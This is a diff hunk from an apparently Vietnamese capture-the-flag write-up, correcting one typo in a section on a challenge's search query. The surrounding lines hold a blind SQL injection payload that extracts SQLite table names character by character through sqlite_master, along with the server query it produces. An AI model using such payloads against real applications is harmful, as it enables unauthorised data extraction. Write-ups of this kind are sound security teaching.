@@ -45,7 +45,7 @@ thành
 - ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/ae13e11e-52fe-4bb5-8360-c2095b361fc4)
 - Đây là query của bài
   ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/317e6d80-27b4-41c2-b14b-c4b6e6d84b37)
-- Sau một vài thử nghiệm thì mình tìm được các để in ra tên của bảng
+- Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng
 - `Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--`
 - Tóm tắt :
 - Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau `SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'`
